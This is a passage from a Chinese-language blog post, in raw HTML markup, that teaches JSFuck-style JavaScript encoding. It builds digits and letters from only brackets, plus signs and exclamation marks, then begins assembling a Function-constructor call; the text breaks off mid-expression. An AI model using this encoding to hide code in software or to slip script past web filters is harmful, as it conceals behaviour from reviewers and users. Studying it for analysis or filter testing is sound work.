class="token string">'"'</span><span class="token operator">+</span><span class="token string">'\\u0061'</span><span class="token operator">+</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据前面的基础，我们已经能够获取 <code>constructor, return</code> 里面的所有字母了，这里再把需要用到的字符全部汇总一下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// " ""</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\\\\</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "\"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "0"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "1"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "2"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "3"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "4"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "5"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "6"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "7"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "8"</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "9"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "a"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "b"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "c"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "d"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "e"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "f"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "n"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "o"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "r"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "s"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "t"</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// "u"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="结果拼接"><a href="#结果拼接" class="headerlink" title="结果拼接"></a>结果拼接</h3><p>最后剩下的就是把想要的输出，转换为 Unicode，再拆分为单个字符对应上面的表达式进行拼接就行了，我们来试一下效果（拿走不谢 :)）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token 